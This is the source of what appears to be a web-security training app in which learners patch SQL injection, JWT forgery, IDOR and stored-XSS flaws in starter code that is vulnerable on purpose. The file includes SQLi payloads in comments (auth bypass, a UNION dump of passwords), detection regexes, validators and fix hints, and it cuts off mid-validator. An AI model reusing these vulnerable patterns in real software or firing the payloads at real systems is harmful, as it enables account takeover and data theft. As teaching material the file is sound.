"use client";

import { useEffect, useState, useRef, useCallback } from "react";

const PATCH_KEYS: Partial<Record<AttackType, string>> = {
  sqli_login: "patched_sqli",
  sqli_search: "patched_sqli_search",
  jwt_forge: "patched_jwt",
  xss: "patched_xss",
  idor: "patched_idor",
};

type Severity = "critical" | "high" | "medium" | "low";
type AttackType = "jwt_forge" | "sqli_login" | "sqli_search" | "idor" | "xss";
type FilterTab = "all" | "acknowledged" | "fixed";

type LogEntry = {
  id: string;
  ts: number;
  type: AttackType;
  severity: Severity;
  ip: string;
  port: number;
  user: string;
  detail: string;
  endpoint: string;
  method: string;
  statusCode: number;
  userAgent: string;
  payload: string;
  country: string;
  patched: boolean;
  detected: boolean;
};

type ScoreEntry = {
  points: number;
  ts: number;
  detail: string;
  type: AttackType;
};

type ChallengeResult = "idle" | "running" | "pass" | "fail";
type SqliLoginFileTab = "route" | "page" | "diff";
type SqliSearchFileTab = "route" | "page" | "diff";
type JwtFileTab = "auth" | "route" | "diff";

type TwoFileSqliLoginChallenge = {
  kind: "two-file-sqli-login";
  title: string;
  description: string;
  points: number;
  routeStarterCode: string;
  pageStarterCode: string;
  routeVulnCode: string;
  pageVulnCode: string;
  routeHints: string[];
  pageHints: string[];
  validateRoute: (code: string) => { pass: boolean; feedback: string };
  validatePage: (code: string) => { pass: boolean; feedback: string };
};

type TwoFileSqliSearchChallenge = {
  kind: "two-file-sqli-search";
  title: string;
  description: string;
  points: number;
  routeStarterCode: string;
  pageStarterCode: string;
  routeVulnCode: string;
  pageVulnCode: string;
  routeHints: string[];
  pageHints: string[];
  validateRoute: (code: string) => { pass: boolean; feedback: string };
  validatePage: (code: string) => { pass: boolean; feedback: string };
};

type TwoFileJwtChallenge = {
  kind: "two-file-jwt";
  title: string;
  description: string;
  points: number;
  authStarterCode: string;
  routeStarterCode: string;
  authVulnCode: string;
  routeVulnCode: string;
  authHints: string[];
  routeHints: string[];
  validateAuth: (code: string) => { pass: boolean; feedback: string };
  validateRoute: (code: string) => { pass: boolean; feedback: string };
};

type SingleSnippetChallenge = {
  kind: "single";
  title: string;
  description: string;
  points: number;
  vulnerableCode: string;
  starterCode: string;
  validate: (code: string) => { pass: boolean; feedback: string };
  hints: string[];
};

type Challenge =
  | TwoFileSqliLoginChallenge
  | TwoFileSqliSearchChallenge
  | TwoFileJwtChallenge
  | SingleSnippetChallenge;

// ─── Full file content ───────────────────────────────────────────────────────
const SQLI_LOGIN_ROUTE_STARTER = `import { NextRequest, NextResponse } from "next/server";
import { getDb } from "../../../lib/db";
import { signToken } from "../../../lib/auth";
import { logAttack, detectSqli } from "../../../lib/logAttack";

export async function POST(req: NextRequest) {
  const { username, password } = await req.json();
  const ip =
    req.headers.get("x-forwarded-for") ??
    req.headers.get("x-real-ip") ??
    "unknown";

  const sqliInUsername = detectSqli(username ?? "");
  const sqliInPassword = detectSqli(password ?? "");

  if (sqliInUsername || sqliInPassword) {
    logAttack({
      type: "sqli",
      severity: "critical",
      ip,
      userId: null,
      username: String(username),
      detail: sqliInUsername
        ? \`SQL injection in username field: "\${username}"\`
        : \`SQL injection in password field: "\${password}"\`,
      raw: { username, password, field: sqliInUsername ? "username" : "password" },
    });
  }

  try {
    const db = await getDb();

    // 🔴 FIX THIS: string concatenation allows SQL injection
    // Exploit: username = admin'--   or   ' OR '1'='1'--
    const query = \`SELECT * FROM users WHERE username='\${username}' AND password='\${password}'\`;
    const [rows]: any = await db.query(query);

    if (!rows || rows.length === 0) {
      return NextResponse.json(
        { success: false, message: "Invalid username or password" },
        { status: 401 }
      );
    }

    const user = rows[0];

    if (sqliInUsername || sqliInPassword) {
      logAttack({
        type: "sqli",
        severity: "critical",
        ip,
        userId: String(user.id),
        username: String(user.username),
        detail: \`SQL injection login bypass SUCCEEDED — authenticated as "\${user.username}" (id=\${user.id})\`,
        raw: { injected_query: query, authenticated_user: { id: user.id, username: user.username, role: user.role } },
      });
    }

    const token = signToken({
      id: user.id,
      username: user.username,
      role: user.role,
      email: user.email,
    });

    const res = NextResponse.json({
      success: true,
      token,
      user: {
        id: user.id,
        username: user.username,
        email: user.email,
        role: user.role,
        balance: user.balance,
        account_number: user.account_number,
      },
    });

    res.cookies.set("session", String(user.id), { path: "/" });
    res.cookies.set("token", token, { path: "/" });
    return res;

  } catch (err: any) {
    // 🔴 FIX THIS: never expose stack traces in production
    return NextResponse.json(
      { success: false, message: err.message, stack: err.stack },
      { status: 500 }
    );
  }
}`;

const SQLI_LOGIN_PAGE_STARTER = `"use client";
import { useState, useEffect } from "react";
import Link from "next/link";
import { useRouter } from "next/navigation";

const PATCH_KEY = "patched_sqli";

export default function LoginPage() {
  const router = useRouter();
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [sqliFixed, setSqliFixed] = useState(false);
  const [attackBlocked, setAttackBlocked] = useState(false);
  const [lastAttack, setLastAttack] = useState<string | null>(null);

  useEffect(() => {
    const check = () => setSqliFixed(localStorage.getItem(PATCH_KEY) === "1");
    check();
    window.addEventListener("storage", check);
    const iv = setInterval(check, 800);
    return () => { clearInterval(iv); window.removeEventListener("storage", check); };
  }, []);

  function detectSqliPattern(val: string): boolean {
    return (
      /'\s*(or|and)\s*'?\d/i.test(val) ||
      /'\s*or\s+1\s*=\s*1/i.test(val) ||
      /'\s*or\s*'1'\s*=\s*'1/i.test(val) ||
      /--[\s]/.test(val) || /--$/.test(val.trim()) ||
      /'\s*--/.test(val) || /#/.test(val) ||
      /union\s+select/i.test(val) ||
      /;\s*(drop|alter|insert|select)/i.test(val)
    );
  }

  function pushRealAttack(username: string, payload: string, succeeded: boolean) {
    const entry = {
      id: Math.random().toString(36).slice(2, 10).toUpperCase(),
      ts: Date.now(),
      type: "sqli",
      severity: "critical",
      ip: "REAL ATTACKER",
      port: 443,
      user: username || "anon",
      detail: succeeded
        ? \`✦ REAL ATTACK — Auth bypass SUCCEEDED via SQLi: "\${username}" authenticated as admin\`
        : \`✦ REAL ATTACK — SQLi attempt detected in login form: "\${username}"\`,
      endpoint: "/api/login",
      method: "POST",
      statusCode: succeeded ? 200 : 401,
      userAgent: navigator.userAgent.slice(0, 60),
      payload: \`username=\${payload}&password=<redacted>\`,
      country: "LIVE",
      patched: false, blocked: false, detected: false, restored: false,
    };
    try {
      const existing = JSON.parse(localStorage.getItem("real_attack_log") || "[]");
      existing.unshift(entry);
      localStorage.setItem("real_attack_log", JSON.stringify(existing.slice(0, 50)));
    } catch { /* ignore */ }
  }

  // 🔴 FIX THIS: the form currently submits even when sqliFixed=true and a
  // payload is detected. Add client-side blocking: when sqliFixed && isInjection,
  // set attackBlocked=true, call pushRealAttack(), and return early.
  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError("");
    setAttackBlocked(false);
    setLastAttack(null);

    const isInjection = detectSqliPattern(username) || detectSqliPattern(password);

    // TODO: add your blocking logic here
    if (isInjection) {
      pushRealAttack(username, username, false);
    }

    try {
      const res = await fetch("/api/login", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, password }),
      });
      const data = await res.json();
      setLoading(false);

      if (data.success) {
        if (isInjection) pushRealAttack(username, username, true);
        localStorage.setItem("token", data.token);
        localStorage.setItem("user", JSON.stringify(data.user));
        document.cookie = \`session=\${data.user.id}; path=/\`;
        router.push("/dashboard");
      } else {
        setError(
          isInjection
            ? "Invalid credentials. (Injection attempt logged.)"
            : data.message || "Invalid username or password."
        );
      }
    } catch {
      setLoading(false);
      setError("Something went wrong. Please try again.");
    }
  };

  return (
    <div>
      {sqliFixed && (
        <div style={{ background: "#f0fdf4", border: "1px solid #bbf7d0", borderRadius: 12, padding: 16, marginBottom: 24 }}>
          Protection Active — parameterized queries enabled
        </div>
      )}
      {attackBlocked && (
        <div style={{ background: "#fef2f2", border: "1px solid #fecaca", borderRadius: 12, padding: 16, marginBottom: 24 }}>
          Threat Intercepted — payload blocked: <code>{lastAttack}</code>
        </div>
      )}
      <form onSubmit={handleLogin}>
        <input value={username} onChange={e => { setUsername(e.target.value); setAttackBlocked(false); setError(""); }} placeholder="Username" required />
        <input type={showPassword ? "text" : "password"} value={password} onChange={e => { setPassword(e.target.value); setAttackBlocked(false); setError(""); }} placeholder="Password" required />
        <button type="submit" disabled={loading}>{loading ? "Signing in..." : "Sign in"}</button>
      </form>
      {error && <div>{error}</div>}
    </div>
  );
}`;

// ─── Search SQLi file starters ────────────────────────────────────────────────
const SQLI_SEARCH_ROUTE_STARTER = `import { NextRequest, NextResponse } from "next/server";
import { getDb } from "../../../lib/db";
import { logAttack, detectSqli } from "../../../lib/logAttack";
import fs from "fs";
import path from "path";

function isSqliSearchPatched(): boolean {
  if (process.env.PATCHED_SQLI_SEARCH === "1") return true;
  try {
    const flagFile = path.join(process.cwd(), ".patch-flags", "sqli_search");
    return fs.existsSync(flagFile);
  } catch { return false; }
}

export async function GET(req: NextRequest) {
  const { searchParams } = new URL(req.url);
  const query = searchParams.get("query") || "";
  const ip =
    req.headers.get("x-forwarded-for") ??
    req.headers.get("x-real-ip") ??
    "unknown";

  const patched = isSqliSearchPatched();

  if (detectSqli(query)) {
    if (patched) {
      logAttack({
        type: "sqli",
        severity: "high",
        ip, userId: null, username: null,
        detail: \`[BLOCKED] SQL injection attempt in /api/search — parameterized queries active: "\${query}"\`,
        raw: { query, blocked: true },
      });
      return NextResponse.json(
        { success: false, message: "Invalid search query." },
        { status: 400 }
      );
    }
    logAttack({
      type: "sqli",
      severity: "high",
      ip, userId: null, username: null,
      detail: \`SQL injection attempt in /api/search query param: "\${query}"\`,
      raw: { query },
    });
  }

  try {
    const db = await getDb();
    let rows: any[];

    if (patched) {
      // ✅ ALREADY PATCHED — this branch is safe
      const [result]: any = await db.query(
        "SELECT id, username, email, role, balance, account_number FROM users WHERE username LIKE ?",
        [\`%\${query}%\`]
      );
      rows = result;
    } else {
      // 🔴 FIX THIS: raw string interpolation is exploitable
      // Payload: ' UNION SELECT id,username,password,email,balance,account_number FROM users--
      const sql = \`SELECT id, username, email, role, balance, account_number
        FROM users WHERE username LIKE '%\${query}%'\`;
      const [result]: any = await db.query(sql);
      rows = result;

      if (detectSqli(query) && rows && rows.length > 0) {
        logAttack({
          type: "sqli",
          severity: "critical",
          ip, userId: null, username: null,
          detail: \`SQL injection on /api/search returned \${rows.length} row(s) — possible data exfiltration\`,
          raw: { query, sql, row_count: rows.length, sample: rows.slice(0, 2) },
        });
      }
    }

    return NextResponse.json({
      success: true,
      results: rows,
      meta: { count: rows.length, search: query, patched },
    });

  } catch (err: any) {
    // 🔴 FIX THIS: never expose stack traces in production
    return NextResponse.json(
      { success: false, message: err.message, stack: err.stack, hint: "Query execution failed" },
      { status: 500 }
    );
  }
}`;

const SQLI_SEARCH_PAGE_STARTER = `"use client";
import { useState, useEffect } from "react";
import Sidebar from "../../components/Sidebar";
import { useTheme } from "../../components/ThemeProvider";

const PATCH_KEY = "patched_sqli_search";

export default function SearchPage() {
  const { isDark } = useTheme();
  const [query, setQuery] = useState("");
  const [results, setResults] = useState<any[]>([]);
  const [loading, setLoading] = useState(false);
  const [searched, setSearched] = useState(false);
  const [sqliFixed, setSqliFixed] = useState(false);
  const [attackBlocked, setAttackBlocked] = useState(false);
  const [lastAttack, setLastAttack] = useState<string | null>(null);

  useEffect(() => {
    function check() { setSqliFixed(localStorage.getItem(PATCH_KEY) === "1"); }
    check();
    const iv = setInterval(check, 800);
    return () => clearInterval(iv);
  }, []);

  function detectSqliPattern(val: string): boolean {
    return (
      /'\s*(or|and)\s*'?\d/i.test(val) ||
      /--[\s]/.test(val) || /--$/.test(val.trim()) || /#/.test(val) ||
      /union\s+select/i.test(val) ||
      /;\s*(drop|alter|insert)/i.test(val) ||
      /'\s*or\s*'1'\s*=\s*'1/i.test(val) ||
      /'\s*--\s*/.test(val) ||
      /'\s*or\s+1\s*=\s*1/i.test(val)
    );
  }

  function pushRealAttack(q: string, succeeded: boolean) {
    const entry = {
      id: Math.random().toString(36).slice(2, 10).toUpperCase(),
      ts: Date.now(),
      type: "sqli_search",
      severity: "critical",
      ip: "REAL ATTACKER",
      port: 443,
      user: "anon",
      detail: succeeded
        ? \`✦ REAL ATTACK — SQLi SUCCEEDED in search: dumped results via "\${q}"\`
        : \`✦ REAL ATTACK — SQLi attempt blocked in search form: "\${q}"\`,
      endpoint: "/api/search",
      method: "GET",
      statusCode: succeeded ? 200 : 403,
      userAgent: navigator.userAgent.slice(0, 60),
      payload: \`query=\${q}\`,
      country: "LIVE",
      patched: !succeeded,
      blocked: false, detected: false, restored: false,
    };
    try {
      const existing = JSON.parse(localStorage.getItem("real_attack_log") || "[]");
      existing.unshift(entry);
      localStorage.setItem("real_attack_log", JSON.stringify(existing.slice(0, 50)));
    } catch { /* ignore */ }
  }

  const runSearch = async () => {
    if (!query.trim()) return;
    const isInjection = detectSqliPattern(query);

    // 🔴 FIX THIS: when sqliFixed is true and injection is detected,
    // block the request client-side before it reaches the server.
    // Set attackBlocked=true, store lastAttack, call pushRealAttack(query, false), return early.

    setAttackBlocked(false);
    setLastAttack(null);
    if (isInjection) pushRealAttack(query, false);

    setLoading(true);
    setSearched(true);
    try {
      const res = await fetch(\`/api/search?query=\${encodeURIComponent(query)}\`);
      const data = await res.json();
      if (data.success) {
        setResults(data.results || []);
        if (isInjection && (data.results?.length ?? 0) > 0) pushRealAttack(query, true);
      } else { setResults([]); }
    } catch { setResults([]); }
    setLoading(false);
  };

  return (
    <div>
      {sqliFixed && (
        <div style={{ background: "#f0fdf4", border: "1px solid #86efac", borderRadius: 12, padding: 16, marginBottom: 24 }}>
          SQL Injection — Patched: parameterized queries active on /api/search
        </div>
      )}
      {attackBlocked && (
        <div style={{ background: "#fff7ed", border: "1px solid #fed7aa", borderRadius: 12, padding: 16, marginBottom: 24 }}>
          Attack Blocked — payload <code>{lastAttack}</code> intercepted by parameterized queries.
        </div>
      )}
      <input
        value={query}
        onChange={e => { setQuery(e.target.value); setAttackBlocked(false); setLastAttack(null); }}
        onKeyDown={e => e.key === "Enter" && runSearch()}
        placeholder="Enter username or account ID..."
      />
      <button onClick={runSearch} disabled={loading}>{loading ? "..." : "Search"}</button>
      {searched && !attackBlocked && (
        <div>
          {results.length === 0 ? (
            // 🔴 XSS also present here — dangerouslySetInnerHTML in no-results message
            <div dangerouslySetInnerHTML={{ __html: \`No users found matching "\${query}"\` }} />
          ) : (
            results.map((u, i) => (
              <div key={i}>
                {/* 🔴 Stored XSS — username rendered via dangerouslySetInnerHTML */}
                <div dangerouslySetInnerHTML={{ __html: u.username || u[1] }} />
                <div>{u.email || u[2]}</div>
                <div style={{ fontSize: 10, fontFamily: "monospace" }}>
                  RAW: {JSON.stringify(u)}
                </div>
              </div>
            ))
          )}
        </div>
      )}
    </div>
  );
}`;

// ─── JWT challenge file starters ─────────────────────────────────────────────
const JWT_AUTH_STARTER = `import jwt from 'jsonwebtoken';

// ✅ YOUR FIX — enforce algorithm, remove weak fallback secret
// The current code accepts ANY algorithm (including "none") and falls back
// to the hardcoded string "secret" when JWT_SECRET is not set.

export function getUserFromToken(token: string) {
  // 🔴 FIX: replace the line below with a secure jwt.verify() call
  return jwt.verify(token, process.env.JWT_SECRET || 'secret');
}

export function signToken(payload: object) {
  return jwt.sign(payload, process.env.JWT_SECRET || 'secret', {
    expiresIn: '7d',
  });
}`;

const JWT_ROUTE_STARTER = `import { NextRequest, NextResponse } from "next/server";
import { getDb } from "../../../lib/db";
import { getUserFromToken } from "../../../lib/auth";
import { logAttack, detectJwtForgery, detectSqli } from "../../../lib/logAttack";

export async function GET(req: NextRequest) {
  const ip =
    req.headers.get("x-forwarded-for")?.split(",")[0].trim() ??
    req.headers.get("x-real-ip") ??
    "unknown";

  const authHeader = req.headers.get("Authorization");
  let token = authHeader?.replace("Bearer ", "");
  if (!token) token = req.cookies.get("token")?.value;

  const decoded: any = getUserFromToken(token);
  const userId = decoded?.id;

  if (!userId) {
    await logAttack({
      type: "recon",
      severity: "low",
      ip,
      detail: "Request with missing or invalid JWT — possible reconnaissance",
      raw: { authHeader, token: token?.slice(0, 40) },
    });
    return NextResponse.json(
      { success: false, message: "Unauthorized (no id in token)" },
      { status: 401 }
    );
  }

  try {
    const db = await getDb();

    // 🔴 FIX THIS: raw interpolation allows SQL injection + IDOR
    // An attacker can forge a JWT with id=2 to read another user's data.
    const query = \`
      SELECT id, username, email, role, balance, account_number, created_at
      FROM users
      WHERE id=\${userId}
    \`;
    const [rows]: any = await db.query(query);

    if (!rows || rows.length === 0) {
      return NextResponse.json(
        { success: false, message: "User not found" },
        { status: 404 }
      );
    }

    const dbUser = rows[0];

    // 🔴 FIX THIS: no ownership check — any valid JWT (even forged) returns
    // whatever row id the attacker injected. Add a check here.

    const { forged, detail } = detectJwtForgery(decoded, dbUser);
    if (forged) {
      await logAttack({
        type: decoded.role !== dbUser.role ? "jwt_forge" : "idor",
        severity: "critical",
        ip,
        userId: String(decoded.id),
        username: decoded.username ?? null,
        detail,
        raw: {
          decodedId: decoded.id,
          decodedRole: decoded.role,
          dbId: dbUser.id,
          dbRole: dbUser.role,
          token: token?.slice(0, 60),
        },
      });
    }

    // 🔴 FIX THIS: never expose stack traces in production
    return NextResponse.json({ success: true, user: dbUser });
  } catch (err: any) {
    return NextResponse.json(
      { success: false, message: err.message, stack: err.stack },
      { status: 500 }
    );
  }
}`;

// ─── Challenges map ───────────────────────────────────────────────────────────
const CHALLENGES: Partial<Record<AttackType, Challenge>> = {
  sqli_login: {
    kind: "two-file-sqli-login",
    title: "Fix SQL Injection — Login API route & login page",
    description:
      "The login API builds queries via string concatenation, letting attackers bypass auth with payloads like admin'-- or ' OR '1'='1'--. Fix the route to use parameterized queries, remove the stack trace leak, and add client-side blocking in the login page.",
    points: 120,
    routeStarterCode: SQLI_LOGIN_ROUTE_STARTER,
    pageStarterCode: SQLI_LOGIN_PAGE_STARTER,
    routeVulnCode: `// ❌ VULNERABLE — string concatenation
const query = \`SELECT * FROM users
  WHERE username='\${username}'
  AND password='\${password}'\`;
const [rows]: any = await db.query(query);`,
    pageVulnCode: `// ❌ VULNERABLE — no client-side blocking when patched
// handleLogin submits even when sqliFixed=true and injection detected.`,
    routeHints: [
      "Replace the template literal with a parameterized query using ? placeholders:",
      `const query = "SELECT * FROM users WHERE username=? AND password=?";\nconst [rows]: any = await db.query(query, [username, password]);`,
      "Also remove stack: err.stack from the catch block — never expose stack traces in production.",
    ],
    pageHints: [
      "Inside handleLogin, right after computing isInjection, add an early return when the patch is active:",
      `if (sqliFixed && isInjection) {\n  setLoading(false);\n  setAttackBlocked(true);\n  setLastAttack(username || password);\n  pushRealAttack(username, username, false);\n  return;\n}`,
    ],
    validateRoute: (code) => {
      const stillTemplate =
        /`[^`]*\$\{username\}[^`]*`/.test(code) ||
        /`[^`]*\$\{password\}[^`]*`/.test(code);
      const hasPlaceholder =
        /WHERE username\s*=\s*\?/.test(code.replace(/\s+/g, " ")) ||
        /\?.*AND.*\?/.test(code.replace(/\s+/g, " "));
      const hasParams = /db\.query\s*\([^,]+,\s*\[/.test(code);
      const hasConcat = /'\s*\+\s*(username|password)/.test(code);
      const hasStackLeak = /stack:\s*err\.stack/.test(code);
      if (hasConcat)
        return {
          pass: false,
          feedback: "❌ Still concatenating strings — use ? placeholders.",
        };
      if (stillTemplate)
        return {
          pass: false,
          feedback:
            "❌ Still using template literal interpolation — still injectable.",
        };
      if (!hasPlaceholder)
        return {
          pass: false,
          feedback:
            "❌ Missing ? placeholders. Replace ${username} and ${password} with ?.",
        };
      if (!hasParams)
        return {
          pass: false,
          feedback:
            "❌ Pass [username, password] as the second argument to db.query().",
        };
      if (hasStackLeak)
        return {
          pass: false,
          feedback:
            "❌ Still leaking err.stack in the error response — remove it.",
        };
      return {
        pass: true,
        feedback:
          "✅ Route fixed! Parameterized query active, no stack trace leak.",
      };
    },
    validatePage: (code) => {
      const hasBlockCheck =
        /sqliFixed\s*&&\s*isInjection/.test(code) ||
        /isInjection\s*&&\s*sqliFixed/.test(code);
      const hasSetBlocked = /setAttackBlocked\s*\(\s*true\s*\)/.test(code);
      const hasPushAttack = /pushRealAttack/.test(code);
      if (!hasBlockCheck)
        return {
          pass: false,
          feedback:
            "❌ Missing if (sqliFixed && isInjection) check in handleLogin.",
        };
      if (!hasSetBlocked)
        return {
          pass: false,
          feedback:
            "❌ Need to call setAttackBlocked(true) and return early when blocked.",
        };
      if (!hasPushAttack)
        return {
          pass: false,
          feedback:
            "❌ Call pushRealAttack() to log the blocked attempt to the defense console.",
        };
      return {
        pass: true,
        feedback:
          "✅ Page fixed! Client blocks and logs injection attempts when patched.",
      };
    },
  },

  sqli_search: {
    kind: "two-file-sqli-search",
    title: "Fix SQL Injection — Search API route & search page",
    description:
      "The /api/search endpoint builds queries with raw string interpolation, allowing UNION-based data exfiltration (dumping all user credentials). Fix the route to use parameterized LIKE queries, remove the stack trace leak, and add client-side blocking on the search page.",
    points: 130,
    routeStarterCode: SQLI_SEARCH_ROUTE_STARTER,
    pageStarterCode: SQLI_SEARCH_PAGE_STARTER,
    routeVulnCode: `// ❌ VULNERABLE — raw interpolation in LIKE query
const sql = \`SELECT id, username, email, role, balance, account_number
  FROM users WHERE username LIKE '%\${query}%'\`;
const [result]: any = await db.query(sql);`,
    pageVulnCode: `// ❌ VULNERABLE — no client-side blocking when patched
// runSearch() fires the API call even when sqliFixed=true and injection detected.`,
    routeHints: [
      "Replace the template literal with a parameterized LIKE query:",
      `const [result]: any = await db.query(\n  "SELECT id, username, email, role, balance, account_number FROM users WHERE username LIKE ?",\n  [\`%\${query}%\`]\n);`,
      "Also remove stack: err.stack from the catch block — never expose it in production responses.",
    ],
    pageHints: [
      "Inside runSearch(), add a guard right after computing isInjection:",
      `if (sqliFixed && isInjection) {\n  setAttackBlocked(true);\n  setLastAttack(query);\n  setSearched(false);\n  setResults([]);\n  pushRealAttack(query, false);\n  return;\n}`,
    ],
    validateRoute: (code) => {
      const stillTemplate =
        /`[^`]*\$\{query\}[^`]*`/.test(code) || /LIKE\s*'%\$\{/.test(code);
      const hasParamLike =
        /LIKE\s*\?/.test(code.replace(/\s+/g, " ")) ||
        /db\.query\s*\([^,]+,\s*\[/.test(code);
      const hasLikeParam =
        /\`%\$\{query\}%\`/.test(code) ||
        /\[`%\${query}%`\]/.test(code) ||
        /\[`%\${/.test(code);
      const hasStackLeak = /stack:\s*err\.stack/.test(code);
      const hasConcat =
        /LIKE\s*'%'\s*\+/.test(code) || /\+\s*query\s*\+/.test(code);
      if (hasConcat)
        return {
          pass: false,
          feedback:
            "❌ Still concatenating strings in the LIKE clause — use ? placeholder.",
        };
      if (stillTemplate)
        return {
          pass: false,
          feedback:
            "❌ Still interpolating query into the SQL string — still injectable.",
        };
      if (!hasParamLike)
        return {
          pass: false,
          feedback:
            "❌ Missing ? placeholder. Use: WHERE username LIKE ? with [\`%${query}%\`].",
        };
      if (hasStackLeak)
        return {
          pass: false,
          feedback:
            "❌ Still leaking err.stack in the error response — remove it.",
        };
      return {
        pass: true,
        feedback:
          "✅ Route fixed! Parameterized LIKE query active, no stack trace leak.",
      };
    },
    validatePage: (code) => {
      const hasBlockCheck =
        /sqliFixed\s*&&\s*isInjection/.test(code) ||
        /isInjection\s*&&\s*sqliFixed/.test(code);
      const hasSetBlocked = /setAttackBlocked\s*\(\s*true\s*\)/.test(code);
      const hasPushAttack = /pushRealAttack/.test(code);
      const hasReturn =
        /pushRealAttack[^}]+return/.test(code.replace(/\n/g, " ")) ||
        (hasSetBlocked && /return/.test(code));
      if (!hasBlockCheck)
        return {
          pass: false,
          feedback:
            "❌ Missing if (sqliFixed && isInjection) check in runSearch().",
        };
      if (!hasSetBlocked)
        return {
          pass: false,
          feedback:
            "❌ Need to call setAttackBlocked(true) when the patch is active.",
        };
      if (!hasPushAttack)
        return {
          pass: false,
          feedback:
            "❌ Call pushRealAttack(query, false) to log the blocked attempt.",
        };
      if (!hasReturn)
        return {
          pass: false,
          feedback:
            "❌ Must return early after blocking — don't let the fetch proceed.",
        };
      return {
        pass: true,
        feedback:
          "✅ Page fixed! Client blocks and logs search injection attempts when patched.",
      };
    },
  },

  jwt_forge: {
    kind: "two-file-jwt",
    title: "Fix JWT Forgery — auth library & user API route",
    description:
      'The auth library accepts any algorithm (including "none") and falls back to the hardcoded secret "secret". The /api/user route also has raw SQL interpolation and no IDOR ownership check. Fix both files to close the attack chain.',
    points: 140,
    authStarterCode: JWT_AUTH_STARTER,
    routeStarterCode: JWT_ROUTE_STARTER,
    authVulnCode: `// ❌ VULNERABLE — accepts alg:"none", weak fallback secret
return jwt.verify(token, process.env.JWT_SECRET || 'secret');`,
    routeVulnCode: `// ❌ VULNERABLE — raw interpolation + no ownership check
const query = \`SELECT ... WHERE id=\${userId}\`;
// no check: dbUser.id !== decoded.id`,
    authHints: [
      "Pass an options object to jwt.verify() that locks the allowed algorithm:",
      `export function getUserFromToken(token: string) {\n  return jwt.verify(token, process.env.JWT_SECRET!, {\n    algorithms: ["HS256"],\n  });\n}`,
      'Also fix signToken() — remove the || "secret" fallback from both calls. The ! assertion tells TypeScript the env var is always set.',
    ],
    routeHints: [
      "Replace the template literal with a parameterized query:",
      `const query = "SELECT id, username, email, role, balance, account_number, created_at FROM users WHERE id = ?";\nconst [rows]: any = await db.query(query, [userId]);`,
      "After fetching dbUser, add an ownership check and remove the stack trace leak:",
      `if (!dbUser || String(dbUser.id) !== String(decoded.id)) {\n  return NextResponse.json(\n    { success: false, message: "Forbidden" },\n    { status: 403 }\n  );\n}\n// In the catch block, remove: stack: err.stack`,
    ],
    validateAuth: (code) => {
      const hasAlgorithms = /algorithms\s*:\s*\[/.test(code);
      const hasHS256 = /['"]HS256['"]/.test(code);
      const hasNone = /['"]none['"]/.test(code);
      const stillWeakVerify =
        /jwt\.verify\s*\([^,]+,\s*(process\.env\.JWT_SECRET\s*\|\|[^)]+|['"]secret['"])\s*\)/.test(
          code.replace(/\s+/g, " "),
        );
      const stillWeakSign =
        /jwt\.sign\s*\([^,]+,\s*process\.env\.JWT_SECRET\s*\|\|/.test(
          code.replace(/\s+/g, " "),
        );
      if (hasNone)
        return {
          pass: false,
          feedback: '❌ "none" is still in the algorithms list — remove it.',
        };
      if (stillWeakVerify)
        return {
          pass: false,
          feedback:
            '❌ jwt.verify() still uses || "secret" fallback. Use process.env.JWT_SECRET! instead.',
        };
      if (!hasAlgorithms)
        return {
          pass: false,
          feedback: '❌ Missing algorithms: ["HS256"] option in jwt.verify().',
        };
      if (!hasHS256)
        return {
          pass: false,
          feedback: '❌ Specify "HS256" as the only allowed algorithm.',
        };
      if (stillWeakSign)
        return {
          pass: false,
          feedback:
            '❌ signToken() still has || "secret" fallback — fix it too.',
        };
      return {
        pass: true,
        feedback: "✅ Auth fixed! HS256 enforced, weak secret removed.",
      };
    },
    validateRoute: (code) => {
      const hasParamQuery =
        /query\s*\(\s*['"`][^'"`]*WHERE id\s*=\s*\?['"`]/.test(
          code.replace(/\s+/g, " "),
        ) ||
        /db\.query\s*\([^,]+,\s*\[userId\]/.test(code.replace(/\s+/g, " "));
      const stillInterpolated =
        /WHERE id=\$\{/.test(code) ||
        /WHERE id='\$/.test(code) ||
        /`[^`]*\$\{userId\}[^`]*`/.test(code);
      const has403 = /403/.test(code);
      const hasForbidden = /[Ff]orbidden/.test(code);
      const hasOwnershipCheck =
        /dbUser\.id.*decoded\.id/.test(code.replace(/\s+/g, " ")) ||
        /decoded\.id.*dbUser\.id/.test(code.replace(/\s+/g, " ")) ||
        /String\(dbUser\.id\).*String\(decoded\.id\)/.test(
          code.replace(/\s+/g, " "),
        );
      const hasStackLeak = /stack:\s*err\.stack/.test(code);
      if (stillInterpolated)
        return {
          pass: false,
          feedback:
            "❌ Still using string interpolation in the SQL query — use ? placeholder.",
        };
      if (!hasParamQuery)
        return {
          pass: false,
          feedback: "❌ Use: db.query('SELECT ... WHERE id = ?', [userId])",
        };
      if (!hasOwnershipCheck)
        return {
          pass: false,
          feedback:
            "❌ Add an ownership check: if dbUser.id !== decoded.id → return 403.",
        };
      if (!has403 || !hasForbidden)
        return {
          pass: false,
          feedback:
            "❌ Return a 403 Forbidden response when the ownership check fails.",
        };
      if (hasStackLeak)
        return {
          pass: false,
          feedback:
            "❌ Still leaking err.stack in the catch block — remove it.",
        };
      return {
        pass: true,
        feedback:
          "✅ Route fixed! Parameterized query + ownership check + no stack leak.",
      };
    },
  },

  xss: {
    kind: "single",
    title: "Fix: Stored XSS via dangerouslySetInnerHTML",
    description:
      "The transfer page renders user data via dangerouslySetInnerHTML, allowing script injection. Replace with safe React text rendering.",
    points: 100,
    vulnerableCode: `// ❌ VULNERABLE
<div dangerouslySetInnerHTML={{
  __html: \`Transfer to <b>\${lastTransfer.toAccount}</b>
           completed. Note: \${lastTransfer.note}\`,
}} />
<div dangerouslySetInnerHTML={{ __html: u.username }} />`,
    starterCode: `// ✅ YOUR FIX — use safe React text rendering
<div>
  Transfer to <b>{lastTransfer.toAccount}</b> completed.
  {/* Render lastTransfer.note safely here */}
</div>
<div>
  {/* Render u.username safely */}
</div>`,
    validate: (code) => {
      const hasDangerous = /dangerouslySetInnerHTML/.test(code);
      const hasNoteRendered =
        /\{lastTransfer\.note\}/.test(code) || /\{note\}/.test(code);
      const hasUsernameRendered =
        /\{u\.username\}/.test(code) || /\{username\}/.test(code);
      if (hasDangerous)
        return {
          pass: false,
          feedback:
            "❌ dangerouslySetInnerHTML is still present — remove it entirely.",
        };
      if (!hasNoteRendered)
        return {
          pass: false,
          feedback:
